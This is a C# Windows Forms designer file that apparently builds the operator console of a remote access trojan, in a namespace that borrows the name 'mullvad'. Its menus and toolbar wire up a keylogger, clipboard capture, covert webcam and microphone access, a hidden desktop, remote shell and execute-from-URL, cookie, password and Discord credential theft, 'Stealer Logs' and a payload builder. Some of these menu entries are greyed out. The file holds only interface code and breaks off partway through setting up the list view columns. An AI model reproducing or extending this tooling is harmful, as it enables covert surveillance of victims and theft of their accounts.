using mullvad.Theme;

namespace mullvad
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
                components.Dispose();
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();

            menuStrip1          = new MenuStrip();
            menuFile            = new ToolStripMenuItem();
            menuFileNew         = new ToolStripMenuItem();
            menuFileOpen        = new ToolStripMenuItem();
            menuFileSave        = new ToolStripMenuItem();
            menuFileSep         = new ToolStripSeparator();
            menuFileExit        = new ToolStripMenuItem();
            menuEdit            = new ToolStripMenuItem();
            menuEditCopy        = new ToolStripMenuItem();
            menuEditPaste       = new ToolStripMenuItem();
            menuEditDelete      = new ToolStripMenuItem();
            menuView            = new ToolStripMenuItem();
            menuViewRefresh     = new ToolStripMenuItem();
            menuViewColumns     = new ToolStripMenuItem();
            menuTools           = new ToolStripMenuItem();
            menuToolsSettings   = new ToolStripMenuItem();
            menuHelp            = new ToolStripMenuItem();
            menuHelpAbout       = new ToolStripMenuItem();

            toolStrip1          = new ToolStrip();
            tsSearch            = new ToolStripTextBox();
            btnReconnect        = new ToolStripButton();
            btnTerminate        = new ToolStripButton();
            btnUninstall        = new ToolStripButton();
            btnSysInfo          = new ToolStripButton();
            btnDisconnect       = new ToolStripButton();
            sep1                = new ToolStripSeparator();
            sep2                = new ToolStripSeparator();
            tsConnections       = new ToolStripButton();
            tsDatabase          = new ToolStripButton();
            tsScreens           = new ToolStripButton();
            tsWebcams           = new ToolStripButton();
            tsAutoTask          = new ToolStripButton();
            tsPortConfig        = new ToolStripButton();
            tsKeywords          = new ToolStripButton();
            tsStealer           = new ToolStripButton();
            menuBuilder            = new ToolStripMenuItem();
            menuBuilderBuild       = new ToolStripMenuItem();
            menuBuilderOpenOutput  = new ToolStripMenuItem();

            splitContainerMain  = new SplitContainer();
            listViewSide        = new ListView();
            splitContainerRight = new SplitContainer();
            panelDetails        = new Panel();
            pbPreview           = new PictureBox();
            panelActionRow      = new Panel();
            grpSysInfo          = new GroupBox();
            lvSysInfo           = new ListView();
            colSysKey           = new ColumnHeader();
            colSysValue         = new ColumnHeader();
            imgListSysInfo      = new ImageList(components) { ImageSize = new Size(16, 16), ColorDepth = ColorDepth.Depth32Bit };
            colSideFlag         = new ColumnHeader();
            colComputer         = new ColumnHeader();
            colUsername         = new ColumnHeader();
            panelRight          = new Panel();
            listViewConnections = new ListView();
            colInfo             = new ColumnHeader();
            colName             = new ColumnHeader();
            colOS               = new ColumnHeader();
            colOSEdition        = new ColumnHeader();
            colArch             = new ColumnHeader();
            colGroup            = new ColumnHeader();
            colInstalled        = new ColumnHeader();
            colNotes            = new ColumnHeader();
            statusStrip1        = new StatusStrip();
            statusLabel         = new ToolStripStatusLabel();

            // Context menus
            contextMenuSide     = new ContextMenuStrip(components);
            menuAccept          = new ToolStripMenuItem();
            menuDecline         = new ToolStripMenuItem();
            menuContextSep      = new ToolStripSeparator();
            menuDetails         = new ToolStripMenuItem();
            menuSideSep2        = new ToolStripSeparator();
            menuAutoRules       = new ToolStripMenuItem();
            menuAutoAccept      = new ToolStripMenuItem();
            menuAutoDecline     = new ToolStripMenuItem();

            contextMenuConnections  = new ContextMenuStrip(components);
            // Management
            menuMgmt                = new ToolStripMenuItem();
            menuMgmtSysInfo         = new ToolStripMenuItem();
            menuMgmtTaskMgr         = new ToolStripMenuItem();
            menuMgmtStartup         = new ToolStripMenuItem();
            menuMgmtRegistry        = new ToolStripMenuItem();
            menuMgmtServices        = new ToolStripMenuItem();
            menuMgmtSep             = new ToolStripSeparator();
            menuMgmtInstalledApps   = new ToolStripMenuItem();
            menuMgmtFirewall        = new ToolStripMenuItem();
            menuMgmtFileExplorer    = new ToolStripMenuItem();
            // Information (split into Computer + Geo)
            menuInformation         = new ToolStripMenuItem();
            // Computer Information sub-menu
            menuCompInfo            = new ToolStripMenuItem();
            menuInfoSysInfo         = new ToolStripMenuItem();
            menuInfoAdvSysInfo      = new ToolStripMenuItem();
            menuInfoNetInfo         = new ToolStripMenuItem();
            menuInfoSep             = new ToolStripSeparator();
            menuInfoSaveAll         = new ToolStripMenuItem();
            // Geo-Location Information sub-menu
            menuGeoInfo             = new ToolStripMenuItem();
            menuGeoLoc              = new ToolStripMenuItem();
            menuAdvGeoLoc           = new ToolStripMenuItem();
            menuGpsExploit          = new ToolStripMenuItem();
            menuGeoSep              = new ToolStripSeparator();
            menuGeoSaveAll          = new ToolStripMenuItem();
            // Remote Management
            menuRemoteMgmt          = new ToolStripMenuItem();
            menuRemoteShell         = new ToolStripMenuItem();
            menuRemoteScripting     = new ToolStripMenuItem();
            menuRemoteExecute       = new ToolStripMenuItem();
            menuRemoteExecDisk      = new ToolStripMenuItem();
            menuRemoteExecUrl       = new ToolStripMenuItem();
            menuDllInjection        = new ToolStripMenuItem();
            // Surveillance
            menuSurveillance        = new ToolStripMenuItem();
            menuKeylogger           = new ToolStripMenuItem();
            menuClipboardMgr        = new ToolStripMenuItem();
menuRemoteWebcam        = new ToolStripMenuItem();
            menuRemoteMic           = new ToolStripMenuItem();
            menuRemoteMicSend       = new ToolStripMenuItem();
            menuDesktopAudio        = new ToolStripMenuItem();
            menuRemoteDesktop       = new ToolStripMenuItem();
            menuRdpNormal           = new ToolStripMenuItem();
            menuRdpH265             = new ToolStripMenuItem();
            menuHiddenDesktop       = new ToolStripMenuItem();
            // Credentials
            menuCredentials         = new ToolStripMenuItem();
            menuRecoverCookies      = new ToolStripMenuItem();
            menuRecoverHistory      = new ToolStripMenuItem();
            menuRecoverPasswords    = new ToolStripMenuItem();
            menuRunFullRecovery     = new ToolStripMenuItem();
            menuCredsSep            = new ToolStripSeparator();
            menuAppsQuick           = new ToolStripMenuItem();
            menuAppsDiscord         = new ToolStripMenuItem();
            menuAppsTelegram        = new ToolStripMenuItem();
            menuAppsSteam           = new ToolStripMenuItem();
            menuAppsSkype           = new ToolStripMenuItem();
            menuAppsWechat          = new ToolStripMenuItem();
            menuInstalledBrowsers   = new ToolStripMenuItem();
            // Post Modules
            menuPostModules         = new ToolStripMenuItem();
            menuProcessMigration    = new ToolStripMenuItem();
            menuProcessInjection    = new ToolStripMenuItem();
            menuBrowserInspection   = new ToolStripMenuItem();
            // Network
            menuNetwork             = new ToolStripMenuItem();
            menuNetworkInfo         = new ToolStripMenuItem();
            menuAdvNetworkInfo      = new ToolStripMenuItem();
            menuMapNetwork          = new ToolStripMenuItem();
            menuNetworkSep          = new ToolStripSeparator();
            menuSaveAll             = new ToolStripMenuItem();
            // Connection
            menuConnection          = new ToolStripMenuItem();
            menuOpenClientFolder    = new ToolStripMenuItem();
            menuDisconnect          = new ToolStripMenuItem();
            menuConnUninstall       = new ToolStripMenuItem();
            menuUpdate              = new ToolStripMenuItem();
            menuConnectionSep       = new ToolStripSeparator();
            menuConnReconnect       = new ToolStripMenuItem();
            menuConnDetails         = new ToolStripMenuItem();
            // Select All
            menuMainSep             = new ToolStripSeparator();
            menuSelectAll           = new ToolStripMenuItem();

            // Image lists
            imgListSide  = new ImageList(components) { ImageSize = new Size(18, 12), ColorDepth = ColorDepth.Depth32Bit };
            imgListMain  = new ImageList(components) { ImageSize = new Size(18, 12), ColorDepth = ColorDepth.Depth32Bit };

            ((System.ComponentModel.ISupportInitialize)splitContainerMain).BeginInit();
            splitContainerMain.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)splitContainerRight).BeginInit();
            splitContainerRight.SuspendLayout();
            menuStrip1.SuspendLayout();
            contextMenuSide.SuspendLayout();
            contextMenuConnections.SuspendLayout();
            SuspendLayout();

            // ---- MenuStrip ----
            menuFileNew.Text = "New"; menuFileOpen.Text = "Open"; menuFileSave.Text = "Save"; menuFileExit.Text = "Exit";
            menuFile.Text = "File";
            menuFile.DropDownItems.AddRange(new ToolStripItem[] { menuFileNew, menuFileOpen, menuFileSave, menuFileSep, menuFileExit });

            menuEditCopy.Text = "Copy"; menuEditPaste.Text = "Paste"; menuEditDelete.Text = "Delete";
            menuEdit.Text = "Edit";
            menuEdit.DropDownItems.AddRange(new ToolStripItem[] { menuEditCopy, menuEditPaste, menuEditDelete });

            menuViewRefresh.Text = "Refresh"; menuViewColumns.Text = "Columns";
            menuView.Text = "View";
            menuView.DropDownItems.AddRange(new ToolStripItem[] { menuViewRefresh, menuViewColumns });

            menuToolsSettings.Text   = "Settings";
            menuToolsSettings.Click += menuToolsSettings_Click;
            menuTools.Text = "Tools";
            menuTools.DropDownItems.Add(menuToolsSettings);

            menuHelpAbout.Text = "About";
            menuHelp.Text = "Help";
            menuHelp.DropDownItems.Add(menuHelpAbout);

            // VPS menu
            menuVps        = new ToolStripMenuItem();
            menuVpsHost    = new ToolStripMenuItem();
            menuVpsConnect = new ToolStripMenuItem();
            menuVpsSep     = new ToolStripSeparator();
            menuVpsStop    = new ToolStripMenuItem();

            menuVpsHost.Text    = "Host";
            menuVpsHost.Click  += menuVpsHost_Click;
            TrySetIcon(menuVpsHost, "server.png");

            menuVpsConnect.Text    = "Connect";
            menuVpsConnect.Click  += menuVpsConnect_Click;
            TrySetIcon(menuVpsConnect, "transmit_blue.png");

            menuVpsStop.Text    = "Disconnect";
            menuVpsStop.Click  += menuVpsStop_Click;
            menuVpsStop.Enabled = false;
            TrySetIcon(menuVpsStop, "server_disconnect.png");

            menuVps.Text = "Host";
            menuVps.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuVpsHost, menuVpsConnect, menuVpsSep, menuVpsStop,
            });

            menuAbout = new ToolStripMenuItem { Text = "About", Alignment = ToolStripItemAlignment.Right };
            menuAbout.Click += menuAbout_Click;

            menuStrip1.Items.AddRange(new ToolStripItem[] { menuFile, menuEdit, menuView, menuTools, menuHelp, menuBuilder, menuVps, menuAbout });
            menuStrip1.Dock = DockStyle.Top;

            // ---- ToolStrip ----
            tsSearch.ToolTipText = "Search clients (IP, computer, user, country, group)";
            tsSearch.Size = new Size(180, 23);
            tsSearch.AutoSize = false;
            tsSearch.TextChanged += tsSearch_TextChanged;

            btnReconnect.Text = "File Explorer"; btnReconnect.ToolTipText = "Open File Explorer for the selected client(s)";
            btnReconnect.DisplayStyle = ToolStripItemDisplayStyle.Image;
            btnReconnect.ImageScaling = ToolStripItemImageScaling.None;
            var iconFileExplorer = mullvad.Theme.IconLoader.Load("folder.png");
            if (iconFileExplorer is not null) btnReconnect.Image = iconFileExplorer;
            else btnReconnect.DisplayStyle = ToolStripItemDisplayStyle.Text;
            btnReconnect.Click += btnReconnect_Click;

            btnTerminate.Text = "Task Manager"; btnTerminate.ToolTipText = "Open Task Manager for the selected client(s)";
            btnTerminate.DisplayStyle = ToolStripItemDisplayStyle.Image;
            btnTerminate.ImageScaling = ToolStripItemImageScaling.None;
            var iconTaskMgr = mullvad.Theme.IconLoader.Load("application_cascade.png");
            if (iconTaskMgr is not null) btnTerminate.Image = iconTaskMgr;
            else btnTerminate.DisplayStyle = ToolStripItemDisplayStyle.Text;
            btnTerminate.Click += btnTerminate_Click;

            btnUninstall.Text = "Remote Desktop"; btnUninstall.ToolTipText = "Open Remote Desktop for the selected client(s)";
            btnUninstall.DisplayStyle = ToolStripItemDisplayStyle.Image;
            btnUninstall.ImageScaling = ToolStripItemImageScaling.None;
            var iconRdp = mullvad.Theme.IconLoader.Load("monitor.png");
            if (iconRdp is not null) btnUninstall.Image = iconRdp;
            else btnUninstall.DisplayStyle = ToolStripItemDisplayStyle.Text;
            btnUninstall.Click += btnUninstall_Click;

            btnSysInfo.Text = "System Information"; btnSysInfo.ToolTipText = "Open System Information for the selected client";
            btnSysInfo.DisplayStyle = ToolStripItemDisplayStyle.Image;
            btnSysInfo.ImageScaling = ToolStripItemImageScaling.None;
            var iconSysInfo = mullvad.Theme.IconLoader.Load("information.png");
            if (iconSysInfo is not null) btnSysInfo.Image = iconSysInfo;
            else btnSysInfo.DisplayStyle = ToolStripItemDisplayStyle.Text;
            btnSysInfo.Click += btnSysInfo_Click;

            btnDisconnect.Text = "Disconnect"; btnDisconnect.ToolTipText = "Disconnect the selected client";
            btnDisconnect.DisplayStyle = ToolStripItemDisplayStyle.Image;
            btnDisconnect.ImageScaling = ToolStripItemImageScaling.None;
            var iconDisconnect = mullvad.Theme.IconLoader.Load("server_disconnect.png");
            if (iconDisconnect is not null) btnDisconnect.Image = iconDisconnect;
            else btnDisconnect.DisplayStyle = ToolStripItemDisplayStyle.Text;
            btnDisconnect.Click += btnDisconnect_Click;

            var boldFont = new Font("Segoe UI", 9F, FontStyle.Regular);

            menuBuilderBuild.Text = "Build";
            menuBuilderBuild.Click += (_, _) => tsBuilder_Click(null!, EventArgs.Empty);
            TrySetIcon(menuBuilderBuild, "save.png");

            menuBuilderOpenOutput.Text = "Open Output Folder";
            menuBuilderOpenOutput.Click += menuBuilderOpenOutput_Click;
            TrySetIcon(menuBuilderOpenOutput, "folder.png");

            menuBuilder.Text = "Builder";
            menuBuilder.DropDownItems.AddRange(new ToolStripItem[] { menuBuilderBuild, menuBuilderOpenOutput });

            tsConnections.Text  = "Connections"; tsConnections.Font  = boldFont; tsConnections.DisplayStyle  = ToolStripItemDisplayStyle.Text; tsConnections.Alignment  = ToolStripItemAlignment.Right; tsConnections.Click  += tsConnections_Click;
            tsDatabase.Text     = "Database";    tsDatabase.Font     = boldFont; tsDatabase.DisplayStyle     = ToolStripItemDisplayStyle.Text; tsDatabase.Alignment     = ToolStripItemAlignment.Right; tsDatabase.Click     += tsDatabase_Click;
            tsScreens.Text      = "Screens";     tsScreens.Font      = boldFont; tsScreens.DisplayStyle      = ToolStripItemDisplayStyle.Text; tsScreens.Alignment      = ToolStripItemAlignment.Right; tsScreens.Click      += tsScreens_Click;
            tsWebcams.Text      = "Webcams";     tsWebcams.Font      = boldFont; tsWebcams.DisplayStyle      = ToolStripItemDisplayStyle.Text; tsWebcams.Alignment      = ToolStripItemAlignment.Right; tsWebcams.Click      += tsWebcams_Click;
            tsAutoTask.Text     = "Auto Task";   tsAutoTask.Font     = boldFont; tsAutoTask.DisplayStyle     = ToolStripItemDisplayStyle.Text; tsAutoTask.Alignment     = ToolStripItemAlignment.Right; tsAutoTask.Click     += tsAutoTask_Click;
            tsPortConfig.Text   = "Port Manager"; tsPortConfig.Font   = boldFont; tsPortConfig.DisplayStyle   = ToolStripItemDisplayStyle.Text; tsPortConfig.Alignment   = ToolStripItemAlignment.Right; tsPortConfig.Click   += tsPortConfig_Click;
            tsKeywords.Text     = "Keywords";    tsKeywords.Font     = boldFont; tsKeywords.DisplayStyle     = ToolStripItemDisplayStyle.Text; tsKeywords.Alignment     = ToolStripItemAlignment.Right; tsKeywords.Click     += tsKeywords_Click;
            tsStealer.Text      = "Stealer Logs";tsStealer.Font      = boldFont; tsStealer.DisplayStyle      = ToolStripItemDisplayStyle.Text; tsStealer.Alignment      = ToolStripItemAlignment.Right; tsStealer.Click      += tsStealer_Click;

            toolStrip1.GripStyle = ToolStripGripStyle.Hidden;
            toolStrip1.Dock      = DockStyle.Top;
            toolStrip1.Layout    += toolStrip1_Layout;
            toolStrip1.Items.AddRange(new ToolStripItem[]
            {
                tsSearch, sep1, btnReconnect, btnTerminate, btnUninstall, btnSysInfo, btnDisconnect, sep2,
                tsStealer, tsKeywords, tsPortConfig, tsAutoTask, tsWebcams, tsScreens, tsDatabase, tsConnections
            });

            // ---- Side context menu ----
            LoadContextMenuIcons();
            menuAccept.Text  = "Accept";  menuAccept.Click  += menuAccept_Click;
            menuDecline.Text = "Decline"; menuDecline.Click += menuDecline_Click;
            menuDetails.Text = "Details"; menuDetails.Click += menuDetails_Click;

            menuAutoAccept.Text         = "Auto Accept";
            menuAutoAccept.CheckOnClick = true;
            menuAutoAccept.Click        += menuAutoAccept_Click;
            TrySetIcon(menuAutoAccept,  "done.png");

            menuAutoDecline.Text         = "Auto Decline";
            menuAutoDecline.CheckOnClick = true;
            menuAutoDecline.Click        += menuAutoDecline_Click;
            TrySetIcon(menuAutoDecline, "cancel.png");

            menuAutoRules.Text = "Auto Rules";
            menuAutoRules.DropDownItems.AddRange(new ToolStripItem[] { menuAutoAccept, menuAutoDecline });
            TrySetIcon(menuAutoRules, "settings.png");

            contextMenuSide.Items.AddRange(new ToolStripItem[]
            {
                menuAccept, menuDecline, menuContextSep, menuDetails,
                menuSideSep2, menuAutoRules,
            });
            contextMenuSide.Opening += contextMenuSide_Opening;

            // ---- Connections context menu ----

            // Management
            menuMgmtSysInfo.Text   = "System Information";
            menuMgmtSysInfo.Click  += menuSysInfo_Click;
            TrySetIcon(menuMgmtSysInfo, "information.png");

            menuMgmtTaskMgr.Text   = "Task Manager";
            menuMgmtTaskMgr.Click += menuMgmtTaskMgr_Click;
            TrySetIcon(menuMgmtTaskMgr, "application_cascade.png");

            menuMgmtStartup.Text   = "Startup Applications";
            menuMgmtStartup.Click += menuMgmtStartup_Click;
            TrySetIcon(menuMgmtStartup, "application_edit.png");

            menuMgmtRegistry.Text   = "Registry Editor";
            menuMgmtRegistry.Click += menuMgmtRegistry_Click;
            TrySetIcon(menuMgmtRegistry, "Registry_Editor.png");

            menuMgmtServices.Text    = "Services";
            menuMgmtServices.Enabled = true;
            menuMgmtServices.Click  += menuMgmtServices_Click;
            TrySetIcon(menuMgmtServices, "cog.png");

            menuMgmtInstalledApps.Text    = "Installed Applications";
            menuMgmtInstalledApps.Click  += menuInstalledApps_Click;
            TrySetIcon(menuMgmtInstalledApps, "application.png");

            menuMgmtFirewall.Text    = "Firewall Rules";
            menuMgmtFirewall.Enabled = false;
            TrySetIcon(menuMgmtFirewall, "server.png");

            menuMgmtFileExplorer.Text  = "File Explorer";
            menuMgmtFileExplorer.Click += menuFileManager_Click;
            TrySetIcon(menuMgmtFileExplorer, "folder.png");

            menuMgmt.Text = "Management";
            menuMgmt.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuMgmtSysInfo, menuMgmtTaskMgr, menuMgmtStartup,
                menuMgmtRegistry, menuMgmtServices, menuMgmtSep,
                menuMgmtInstalledApps, menuMgmtFirewall, menuMgmtFileExplorer,
            });
            TrySetIcon(menuMgmt, "cog.png");

            // Information — Computer sub-menu
            menuInfoSysInfo.Text   = "System Information";
            menuInfoSysInfo.Click += menuSysInfo_Click;
            TrySetIcon(menuInfoSysInfo, "information.png");

            menuInfoAdvSysInfo.Text   = "Advanced System Information";
            menuInfoAdvSysInfo.Click += menuAdvSysInfo_Click;
            TrySetIcon(menuInfoAdvSysInfo, "information.png");

            menuInfoNetInfo.Text   = "Network Information";
            menuInfoNetInfo.Click += menuNetInfo_Click;
            TrySetIcon(menuInfoNetInfo, "transmit_blue.png");

            menuInfoSaveAll.Text   = "Save all to Database";
            menuInfoSaveAll.Click += menuSaveAll_Click;
            TrySetIcon(menuInfoSaveAll, "save.png");

            menuCompInfo.Text = "Computer Information";
            menuCompInfo.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuInfoSysInfo, menuInfoAdvSysInfo, menuInfoNetInfo, menuInfoSep, menuInfoSaveAll,
            });
            TrySetIcon(menuCompInfo, "information.png");

            // Information — Geo-Location sub-menu
            menuGeoLoc.Text   = "Geo-Location Information";
            menuGeoLoc.Click += menuGeoLoc_Click;
            TrySetIcon(menuGeoLoc, "world_go.png");

            menuAdvGeoLoc.Text   = "Advanced Geo-Location Information";
            menuAdvGeoLoc.Click += menuAdvGeoLoc_Click;
            TrySetIcon(menuAdvGeoLoc, "world_link.png");

            menuGpsExploit.Text   = "Geo-Location GPS";
            menuGpsExploit.Click += menuGpsExploit_Click;
            TrySetIcon(menuGpsExploit, "world_go.png");

            menuGeoSaveAll.Text   = "Save all to Database";
            menuGeoSaveAll.Click += menuSaveAll_Click;
            TrySetIcon(menuGeoSaveAll, "save.png");

            menuGeoInfo.Text = "Geo-Location Information";
            menuGeoInfo.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuGeoLoc, menuAdvGeoLoc, menuGpsExploit, menuGeoSep, menuGeoSaveAll,
            });
            TrySetIcon(menuGeoInfo, "world_go.png");

            menuInformation.Text = "Information";
            menuInformation.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuCompInfo, menuGeoInfo,
            });
            TrySetIcon(menuInformation, "information.png");

            // Remote Management
            menuRemoteExecDisk.Text = "From Disk";
            TrySetIcon(menuRemoteExecDisk, "drive_go.png");
            menuRemoteExecDisk.Click += menuRemoteExecDisk_Click;
            menuRemoteExecUrl.Text  = "From URL";
            TrySetIcon(menuRemoteExecUrl, "world_go.png");
            menuRemoteExecUrl.Click += menuRemoteExecUrl_Click;
            menuRemoteExecute.Text  = "Remote Execute";
            menuRemoteExecute.DropDownItems.AddRange(new ToolStripItem[] { menuRemoteExecDisk, menuRemoteExecUrl });
            TrySetIcon(menuRemoteExecute, "lightning.png");

            menuRemoteShell.Text   = "Remote Shell";
            menuRemoteShell.Click += menuRemoteShell_Click;
            TrySetIcon(menuRemoteShell, "terminal.png");

            menuRemoteScripting.Text   = "Remote Scripting";
            menuRemoteScripting.Click += menuRemoteScripting_Click;
            TrySetIcon(menuRemoteScripting, "terminal.png");
            menuDllInjection.Text = "DLL Injection";
            TrySetIcon(menuDllInjection, "bricks.png");
            menuDllInjection.Enabled = false;

            menuRemoteMgmt.Text    = "Remote Management";
            menuRemoteMgmt.DropDownItems.AddRange(new ToolStripItem[] { menuRemoteShell, menuRemoteScripting, menuRemoteExecute, menuDllInjection });
            TrySetIcon(menuRemoteMgmt, "lightning.png");

            // Surveillance
            menuClipboardMgr.Text   = "Clipboard Manager";
            menuClipboardMgr.Click += menuClipboardMgr_Click;
            TrySetIcon(menuClipboardMgr, "page_copy.png");

menuRemoteWebcam.Text    = "Remote Webcam";
            menuRemoteWebcam.Click  += menuRemoteWebcam_Click;
            TrySetIcon(menuRemoteWebcam, "webcam.ico");
            menuRemoteMic.Text   = "Remote Microphone";
            menuRemoteMic.Click += menuRemoteMic_Click;
            TrySetIcon(menuRemoteMic, "music.png");
            menuRemoteMicSend.Text   = "Remote Microphone Send";
            menuRemoteMicSend.Click += menuRemoteMicSend_Click;
            TrySetIcon(menuRemoteMicSend, "transmit_blue.png");
            menuDesktopAudio.Text    = "Remote Desktop Audio";
            menuDesktopAudio.Click  += menuDesktopAudio_Click;
            TrySetIcon(menuDesktopAudio, "audio.ico");
            menuRdpNormal.Text    = "Remote Desktop";
            menuRdpNormal.Click  += menuRdpNormal_Click;
            TrySetIcon(menuRdpNormal, "monitor.png");
            menuRdpH265.Text      = "Remote Desktop H265";
            menuRdpH265.Click    += menuRdpH265_Click;
            TrySetIcon(menuRdpH265, "monitor.png");
            menuRemoteDesktop.Text = "Remote Desktop";
            menuRemoteDesktop.DropDownItems.AddRange(new ToolStripItem[] { menuRdpNormal, menuRdpH265 });
            TrySetIcon(menuRemoteDesktop, "monitor.png");
            menuHiddenDesktop.Text    = "Hidden Desktop";
            menuHiddenDesktop.Enabled = true;
            menuHiddenDesktop.Click  += menuHiddenDesktop_Click;
            TrySetIcon(menuHiddenDesktop, "monitor.png");

            menuSurveillance.Text    = "Surveillance";
            menuSurveillance.Enabled = true;
            menuKeylogger.Text   = "Keylogger";
            menuKeylogger.Click += menuKeylogger_Click;
            TrySetIcon(menuKeylogger, "keyboard_add.png");

            menuSurveillance.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuKeylogger, menuClipboardMgr,
                new ToolStripSeparator(),
                menuRemoteWebcam, menuRemoteMic, menuRemoteMicSend,
                menuDesktopAudio, menuRemoteDesktop, menuHiddenDesktop,
            });
            TrySetIcon(menuSurveillance, "monitoring.png");

            // Credentials (grayed)
            menuRecoverCookies.Text   = "Recover Cookies";
            TrySetIcon(menuRecoverCookies, "cookierecovery.png");
            menuRecoverHistory.Text   = "Recover History";
            TrySetIcon(menuRecoverHistory, "page_copy.png");
            menuRecoverPasswords.Text = "Recover Passwords";
            TrySetIcon(menuRecoverPasswords, "key_go.png");
            menuRunFullRecovery.Text  = "Run Full Recovery";
            TrySetIcon(menuRunFullRecovery, "key_go.png");
            menuRunFullRecovery.Click += menuRunFullRecovery_Click;

            menuAppsDiscord.Text   = "Discord";
            menuAppsDiscord.Click += menuAppsDiscord_Click;
            menuAppsTelegram.Text = "Telegram";
            menuAppsSteam.Text    = "Steam";
            menuAppsSkype.Text    = "Skype";
            menuAppsWechat.Text   = "WeChat";
            TrySetIcon(menuAppsDiscord,  "discord.png");
            TrySetIcon(menuAppsTelegram, "telegram.png");
            TrySetIcon(menuAppsSteam,    "steam.png");
            TrySetIcon(menuAppsSkype,    "skype.png");
            TrySetIcon(menuAppsWechat,   "wechat.png");
            menuAppsQuick.Text    = "Applications (Quick)";
            menuAppsQuick.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuAppsDiscord, menuAppsTelegram, menuAppsSteam, menuAppsSkype, menuAppsWechat,
            });
            TrySetIcon(menuAppsQuick, "application.png");

            menuInstalledBrowsers.Text = "Installed Browsers";
            TrySetIcon(menuInstalledBrowsers, "world_link.png");

            menuCredentials.Text    = "Credentials";
            menuCredentials.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuRecoverCookies, menuRecoverHistory, menuRecoverPasswords, menuRunFullRecovery,
                menuCredsSep, menuAppsQuick, menuInstalledBrowsers,
            });
            TrySetIcon(menuCredentials, "key_go.png");
            // Only Run Full Recovery is wired up so far � keep the rest grayed out.
            menuRecoverCookies.Enabled  = false;
            menuRecoverHistory.Enabled  = false;
            menuRecoverPasswords.Enabled = false;

            // Post Modules (grayed)
            menuProcessMigration.Text   = "Process Migration";
            menuProcessMigration.Click += menuProcessMigration_Click;
            menuProcessMigration.Enabled = false;
            TrySetIcon(menuProcessMigration, "arrow_down.png");
            menuProcessInjection.Text  = "Process Injection";
            TrySetIcon(menuProcessInjection, "bricks.png");
            menuBrowserInspection.Text   = "Browser Inspection";
            menuBrowserInspection.Click += menuBrowserInspection_Click;
            TrySetIcon(menuBrowserInspection, "website.png");

            menuProcessInjection.Enabled = false;

            menuPostModules.Text    = "Post Modules";
            menuPostModules.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuProcessMigration, menuProcessInjection, menuBrowserInspection,
            });
            TrySetIcon(menuPostModules, "application_delete.png");

            // Network
            menuNetworkInfo.Text  = "Network Information";
            menuNetworkInfo.Click += menuNetInfo_Click;
            TrySetIcon(menuNetworkInfo, "transmit_blue.png");

            menuAdvNetworkInfo.Text    = "Advanced Network Information";
            menuAdvNetworkInfo.Enabled = false;
            TrySetIcon(menuAdvNetworkInfo, "world_link.png");

            menuMapNetwork.Text    = "Map Network Connections";
            menuMapNetwork.Enabled = false;
            menuMapNetwork.Click  += menuMapNetwork_Click;
            TrySetIcon(menuMapNetwork, "world_go.png");

            menuSaveAll.Text   = "Save all to Database";
            menuSaveAll.Click += menuSaveAll_Click;
            TrySetIcon(menuSaveAll, "save.png");

            menuNetwork.Text = "Network";
            menuNetwork.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuNetworkInfo, menuAdvNetworkInfo, menuMapNetwork, menuNetworkSep, menuSaveAll,
            });
            TrySetIcon(menuNetwork, "transmit_blue.png");

            // Connection
            menuOpenClientFolder.Text  = "Open Client Folder";
            menuOpenClientFolder.Click += menuOpenClientFolder_Click;
            TrySetIcon(menuOpenClientFolder, "folder.png");

            menuDisconnect.Text  = "Disconnect";
            menuDisconnect.Click += menuDisconnect_Click;
            TrySetIcon(menuDisconnect, "server_disconnect.png");

            menuConnUninstall.Text  = "Uninstall";
            menuConnUninstall.Click += menuUninstall_Click;
            TrySetIcon(menuConnUninstall, "delete.png");

            menuUpdate.Text  = "Update";
            menuUpdate.Click += menuUpdate_Click;
            TrySetIcon(menuUpdate, "arrow_up.png");

            menuConnReconnect.Text  = "Reconnect";
            menuConnReconnect.Click += menuReconnect_Click;
            TrySetIcon(menuConnReconnect, "refresh.png");

            menuConnDetails.Text  = "Details";
            menuConnDetails.Click += menuConnDetails_Click;
            TrySetIcon(menuConnDetails, "information.png");

            menuConnection.Text = "Connection";
            menuConnection.DropDownItems.AddRange(new ToolStripItem[]
            {
                menuOpenClientFolder, menuDisconnect, menuConnUninstall, menuUpdate,
                menuConnectionSep, menuConnReconnect, menuConnDetails,
            });
            TrySetIcon(menuConnection, "server.png");

            // Select All
            menuSelectAll.Text  = "Select All";
            menuSelectAll.Click += menuSelectAll_Click;

            contextMenuConnections.Items.AddRange(new ToolStripItem[]
            {
                menuMgmt, menuInformation, menuRemoteMgmt, menuSurveillance, menuCredentials,
                menuPostModules, menuNetwork, menuConnection, menuMainSep, menuSelectAll,
            });
            contextMenuConnections.Opening += contextMenuConnections_Opening;

            // ---- Left ListView ----
            colSideFlag.Text  = "";          colSideFlag.Width  = 24;
            colComputer.Text  = "Computer";  colComputer.Width  = 100;
            colUsername.Text  = "Username";  colUsername.Width  = 80;
            listViewSide.Columns.AddRange(new ColumnHeader[] { colSideFlag, colComputer, colUsername });
            listViewSide.Dock             = DockStyle.Fill;
            listViewSide.View             = View.Details;
            listViewSide.FullRowSelect    = true;
            listViewSide.GridLines        = false;
            listViewSide.MultiSelect      = false;
            listViewSide.Font             = new Font("Segoe UI", 9F);
            listViewSide.ForeColor        = Color.Black;
            listViewSide.HeaderStyle      = ColumnHeaderStyle.Nonclickable;
            listViewSide.SmallImageList   = imgListSide;
            listViewSide.OwnerDraw        = true;
            listViewSide.ContextMenuStrip = contextMenuSide;
            listViewSide.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            listViewSide.DrawItem         += (s, e) => e.DrawDefault = false;
            listViewSide.DrawSubItem      += DrawSubItemSide;

            // ---- Main connections ListView (Exotic-style columns) ----
            colInfo.Text      = "Information";          colInfo.Width      = 100;
            colName.Text      = "Computer";             colName.Width      = 175;
